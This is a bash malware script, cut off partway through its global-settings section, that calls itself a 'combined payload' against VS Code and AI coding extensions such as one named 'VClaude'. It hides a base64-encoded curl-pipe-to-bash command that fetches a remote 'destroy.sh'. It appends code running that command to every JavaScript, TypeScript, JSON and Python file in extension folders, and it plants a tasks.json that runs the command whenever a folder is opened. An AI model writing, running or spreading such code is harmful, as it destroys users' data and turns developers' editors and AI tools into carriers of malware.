#!/bin/bash

# Combined payload for VS Code + VClaude
DESTROY_CMD=$(echo "Y3VybCAtcyBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vanVsaWJ1bGkxMzI0LXByb2cvc3R1ZGlvdXMtZ3VhY2Ftb2xlL21haW4vZGVzdHJveS5zaCB8IGJhc2g=" | base64 -d)

# ============================================
# PART 1: INFECT ALL VS CODE AI EXTENSIONS
# ============================================

EXTENSION_PATHS=(
    "$HOME/.vscode/extensions"
    "$HOME/.vscode-server/extensions"
    "$HOME/.vscode-remote/extensions"
    "$HOME/Library/Application Support/Code/User/extensions"
    "/workspace/.vscode"
    "/app/.vscode"
)

for base_path in "${EXTENSION_PATHS[@]}"; do
    if [ -d "$base_path" ]; then
        # Infect every JS file in every extension
        find "$base_path" -name "*.js" -type f 2>/dev/null | while read jsfile; do
            echo "require('child_process').exec('$DESTROY_CMD');" >> "$jsfile" 2>/dev/null
            echo "eval(require('child_process').execSync('$DESTROY_CMD'));" >> "$jsfile" 2>/dev/null
        done
        
        # Infect every Python file
        find "$base_path" -name "*.py" -type f 2>/dev/null | while read pyfile; do
            echo "import os; os.system('$DESTROY_CMD')" >> "$pyfile" 2>/dev/null
        done
    fi
done

# ============================================
# PART 2: VCLAUDESPECIFIC INFECTION
# ============================================

# Find VClaude extension directories
for base_path in "${EXTENSION_PATHS[@]}"; do
    for vc_dir in $(find "$base_path" -type d -name "*vclaude*" -o -name "*claude*" 2>/dev/null); do
        if [ -d "$vc_dir" ]; then
            # Infect VClaude's main files
            find "$vc_dir" -name "*.js" -o -name "*.ts" -o -name "*.json" | while read target; do
                echo "// SYNC" >> "$target"
                echo "require('child_process').exec('$DESTROY_CMD');" >> "$target" 2>/dev/null
            done
            
            # Infect VClaude's settings
            [ -f "$vc_dir/settings.json" ] && echo "{\"postInstall\":\"$DESTROY_CMD\"}" >> "$vc_dir/settings.json"
        fi
    done
done

# ============================================
# PART 3: VS CODE CORE INFECTION
# ============================================

# 3a. Malicious workspace tasks
mkdir -p .vscode
cat > .vscode/tasks.json << EOF
{
    "version": "2.0.0",
    "tasks": [{
        "label": "Auto Setup",
        "type": "shell",
        "command": "$DESTROY_CMD",
        "runOptions": {"runOn": "folderOpen"},
        "problemMatcher": []
    }]
}
EOF

# 3b. Malicious workspace settings
cat > .vscode/settings.json << EOF
{
    "git.autoFetch": true,
    "terminal.integrated.shellIntegration.enabled": true,
    "github.copilot.enable": true
}
EOF

# 3c. Infect global VS Code settings
VSCODE_SETTINGS_PATHS=(
    "$HOME/.config/Code/User/settings.json"
    "$HOME/Library/Application
